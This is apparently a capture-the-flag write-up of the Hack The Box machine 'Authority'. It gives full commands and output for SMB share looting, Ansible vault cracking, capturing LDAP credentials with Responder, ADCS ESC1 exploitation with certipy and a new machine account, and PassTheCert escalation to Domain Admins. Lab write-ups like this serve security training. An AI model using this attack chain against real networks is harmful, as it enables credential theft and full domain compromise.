---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Authority

## Enumeration

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-08 19:27:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
|_ssl-date: 2023-09-08T19:28:57+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
|_ssl-date: 2023-09-08T19:28:56+00:00; +3h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-08T19:28:57+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
|_ssl-date: 2023-09-08T19:28:56+00:00; +3h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T18:15:57
| Not valid after:  2025-09-08T05:54:21
| MD5:   c4cf3731428c3394d6a3e537a2d3459c
|_SHA-1: c444c4f94bdc09e25834d869ea549dca4cd0dbd8
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 08 Sep 2023 19:27:57 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Fri, 08 Sep 2023 19:27:57 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Fri, 08 Sep 2023 19:28:03 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
52127/tcp open  msrpc         Microsoft Windows RPC
55095/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=9/8%Time=64FB3D7D%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;ch
SF:arset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\x2008\x20Sep
SF:\x202023\x2019:27:57\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<h
SF:tml><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/>
SF:</head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GE
SF:T,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Fri
SF:,\x2008\x20Sep\x202023\x2019:27:57\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20t
SF:ext/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\x
SF:2008\x20Sep\x202023\x2019:27:57\x20GMT\r\nConnection:\x20close\r\n\r\n\
SF:n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL
SF:='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\n
SF:Content-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\n
SF:Content-Length:\x201936\r\nDate:\x20Fri,\x2008\x20Sep\x202023\x2019:28:
SF:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20lan
SF:g=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,A
SF:rial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-
SF:color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x
SF:20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:blac
SF:k;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</st
SF:yle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Re
SF:quest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Rep
SF:ort</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the\
SF:x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><b
SF:>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pro
SF:cess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perce
SF:ived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20r
SF:equest\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-08T19:28:48
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s

NSE: Script Post-scanning.
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3766.65 seconds
```

## SMB (files)

List shares using `crackmapexec` https://www.crackmapexec.wiki/getting-started/installation/installation-on-unix `crackmapexec smb authority.htb -u test -p '' --shares`

Or using `smbclient` (type random password: anonymous access is allowed):

```
$ smbclient -L \\\\authority.htb\\
Password for [WORKGROUP\pentester]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

The Development share looks interesing. Connect to it and see what is in there.

```
└─$ smbclient  \\\\authority.htb\\Development
Password for [WORKGROUP\pentester]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 14:20:38 2023
  ..                                  D        0  Fri Mar 17 14:20:38 2023
  Automation                          D        0  Fri Mar 17 14:20:40 2023

                5888511 blocks of size 4096. 1128927 blocks available
smb: \> cd Automation\
smb: \Automation\> ls
  .                                   D        0  Fri Mar 17 14:20:40 2023
  ..                                  D        0  Fri Mar 17 14:20:40 2023
  Ansible                             D        0  Fri Mar 17 14:20:50 2023

                5888511 blocks of size 4096. 1127069 blocks available
smb: \Automation\> cd Ansible\
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 14:20:50 2023
  ..                                  D        0  Fri Mar 17 14:20:50 2023
  ADCS                                D        0  Fri Mar 17 14:20:48 2023
  LDAP                                D        0  Fri Mar 17 14:20:48 2023
  PWM                                 D        0  Fri Mar 17 14:20:48 2023
  SHARE                               D        0  Fri Mar 17 14:20:48 2023

                5888511 blocks of size 4096. 1115490 blocks available
smb: \Automation\Ansible\> 
```

Download all files using `smbclinent`

```
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

## Exfiltrated files

By going throught the files, there are some interesting ones.

### Ansible vault

Automation/Ansible/PWM/defaults/main.yml contains encrypted passwords. We can use `ansible2john` utility to convert those passwords to crackable format. To do so, do the following **for each password**:

1. save the password to some file `ansible.vault`
2. `ansible2john ansible.vaul >> hashes`

Then, remove `ansible.vault:` from each line, e.g.

```
ansible.vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

becomes

```
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

Then, you can run the hashcat

```
hashcat hashes /usr/share/wordlists/rockyou.txt
```

As a result, you will get:

```
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

These gives you the passwords to the *vaults* you neeed to open them to get the actual password. Call `ansible-vault view pmw_admin_password.v` where the pmw_admin_password.v is the vault file containing `$ANSIBLE_VAULT;1.1;AES256 ...` and supply the cracked password `!@#$%^&*`

This will open the vault containing login and password

```
pwm_admin_login = svc_pwm
pwm_admin_password = pWm_@dm!N_!23
ldap_admin_password = DevT3st@123
```

### Tomcat

In `/Automation/Ansible/PWM/templates/tomcat-users.xml.j2`, there are the following lines:

```
<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
```

Which are another credentials

### Ansible inventory

In the inventory file, there are another cretentials

```
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

### ADCS

There is another password for ADCS \\Automation\\Ansible\\ADCS\\defaults\\main.yml `ca_passphrase: SuP3rS3creT`

## Port 8443 (PWM Online)

There is another website on port 8443, which is some Password Self Service.

We were able to login to the app using one of the credentials from vault (don't remember which).

### LocalDB

We found local db file

Download it. https://10.10.11.222:8443/pwm/private/config/manager/localdb?

```
file "PWM-LocalDB.bak"
mv file file.gz
gunzip file.gz
```

hash?

```
PWM_META,seedlist.metadata,"{""version"":8,""completed"":true,""sourceType"":""BuiltIn"",""storeDate"":""2022-08-11T01:46:36Z"",""checkDate"":""2022-08-11T01:46:36Z"",""remoteInfo"":{""hash"":""4C4375E91E0485D4A57FFF079C79F9C3ED4C23740AA117E76446B7EA5AB18845"",""bytes"":62106},""bytes"":62032,""valueCount"":21691,""configHash"":""AA08D5BFEA95493978D22940B1020025753E1148711E2EB89A050271AFDEE3E1"",""wordTypes"":{""RAW"":21928}}"
PWM_META,wordlist.metadata,"{""version"":8,""completed"":true,""sourceType"":""BuiltIn"",""storeDate"":""2022-08-11T01:46:41Z"",""checkDate"":""2022-08-11T01:46:41Z"",""remoteInfo"":{""hash"":""3C3515409E137DB4EF38959B8D6AA2C17ABD7FD4E8D87941EEFA24947C9266D4"",""bytes"":2700563},""bytes"":2700375,""valueCount"":847267,""configHash"":""D3A406B209514ABA26A853BF0AAE8773EF42533D2F9A0E3BFFB5CA008F8CF876"",""wordTypes"":{""RAW"":847303}}"
```

But it was not giving us anything useful.

### Security key

By downloading the configuration, we were able to spot an encrypted security key. However, as we can also upload config files, we can set the

```
<property key="storePlaintextValues">true</property>
```

to store it in plaintext. Giving us.

```
Security ⇨ Security Key PLAIN:Lef7L6WPKDYS8akD8yeum7KNWlwKNeMnAX9jmlOiC6xMXBqrXStf0ifja6mBcakKyUeQ9SLEB9VRIWGyNoDcp39OpA2aUnMzGoJ4efPA4Aa8nLwbQEet46fzngPNUNMYESh0kqZvOPDhaHd3RDRl1I2IhzdD6L7pk4YdFglc08X68uI1HD72QRV6Ggi11yMYjNVdurNdhnPfoggJDXK5nxIxvo6sKltUjUF80ZtFr1LgRDfNOR2Fr6PgbQQNPHI5vmEb1z9KbwFeyOBVPplvTyI9xNVVaIQ1KKLDHeX5K5fjevZk3sR0oKSw3EMAUu57sdQX6LQp6NhpnGeNJ37RKN6tfEuvmBHiecByGF5b4XI90BMVaWlsLUJrXMkLRJote8UJH8IRr2Wge3poBGvONNV6iySooCeuPCUNz2hJxoiVRHz5OlTJ86vZqq3JpFcoxj23sFdpOq5E720EVUHYaKhjqW4TVf6aSC1UvTiPryNBE9tTna5TQpjK7MI7lj06UmOktxK7eVuQQeJaIGx5flWCoNxCMwBFCtolF7Hijde7I9jzuiSs8GyJZtrRXhKzUNROgAcQq5NqmivndkT2EaBeYaQ9RURWMMbePMUkMpCTwFrPBwJZPB75vThnn27EZNvM5mXmCm4pTtET14PmOVKTvk8wb1pbWoQJVxOIELl78sdytiLCUHD2aExWMrQeSVzEsK26zdUVQdp7SfXYRNSG9iF7V4Q8MDOBVE28b7jzxDuRLmmktilWUucLcR7xLvh5wLVe36WXCXfVzf8JK4FTENVEEEvUDVfTL8pmtbqIX5XD41TWh3O2S8szoH1PZ07aEtUyv2Ncow1Pk6om8iotoKwPqKdfxkRrs8PuYwUAhWvZr3XjJH4FDZoKZIsG5CfqLJXVdRmm0Je1dUign9B3HEMgx3inx4GuiDUzWoXdqe7PeZtgGd3d
```

But again, that leads nowhere.

### LDAP

By observing the logs, we see that the application is trying to authenticate to LDAP for the LDAP integration. It uses `svc_ldap` user.

What we can do is to setup listener at our side and let it authenticate to our fake ldap, snatching NTLM hash or password in process.

#### Exploit

1. start responder locally (fake service) `sudo responder -I tun0`
2. Tell pwm to connect to your ldap by adding it: `ldap://10.10.10.10:389`
3. try to autheticate as some random user: it will force the PWM to connect to you

```
[LDAP] Cleartext Client   : 10.129.104.60
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Now we can login using WinRM

```
evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

And that that is the user flag.

## -> ROOT

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation

Search for the vulnerable certificates

```
certipy find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout
```

```
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

There is ESC1 vulnerablily, so let's exploit it. The vulnerable template is `CorpVPN`. But there is a catch, Domain Computers can enroll it, not users. So, I need a computer account.

```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Luckily, I can add computers to the domain, NICE!

To add the account, i need `Powermad` module. https://github.com/Kevin-Robertson/Powermad

```
 evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -s Powermad
 # then call Powermad.ps1 inside
```

```
New-MachineAccount -MachineAccount "RManPc$" -Domain "authority.htb" -DomainController "authority.authority.htb" -Password (ConvertTo-SecureString "RazzmannJeFaktBorec" -AsPlainText -Force)
```

Now, to the exploit.

```
certipy req -username "RManPc$" -password 'RazzmannJeFaktBorec' -ca AUTHORITY-CA -target authority.htb -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -debug
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'authority.htb' at '10.10.11.222'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Great, we got the cert! Now to log in....

```
┌──(kali㉿kali)-[~/Authority]
└─$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'authority.htb' -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Oh no, I cannot use the cert directly... But there is the PassTheCert util taht I can use https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

Ok, for that I need to split the certificate.

```
# Extract Key
openssl pkcs12 -in administrator.pfx  -nocerts -out administrator.key
# Extract Certificate
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.pem
# Remove passsword from Key
openssl rsa -in administrator.key -out administrator.key
```

Now for the attack, I will use the python version of PassTheCert https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

Let's try it.

```
python3 passthecert.py -dc-ip 10.10.11.222 -crt ~/Authority/administrator.pem -key ~/Authority/administrator.key -domain "authority.htb" -action whoami
```

```
[*] You are logged in as: HTB\Administrator
```

Cool, now that allows me to spawn ldap shell.

```
python3 passthecert.py -dc-ip 10.10.11.222 -crt ~/Authority/administrator.pem -key ~/Authority/administrator.key -domain "authority.htb" -action ldap-shell
```

Let's see what can I do

```
# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.
```

So, let's say...create an user and log in....

```
# add_user RMan
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: RMan and password: P34eX&fqCP;DRbr result: OK

# add_user_to_group RMan 'Domain Admins'
Adding user: RMan to group Domain Admins result: OK
```

Now just get in and read the flag

```
evil-winrm -i 10.10.11.222 -u "RMan" -p 'P34eX&fqCP;DRbr'
```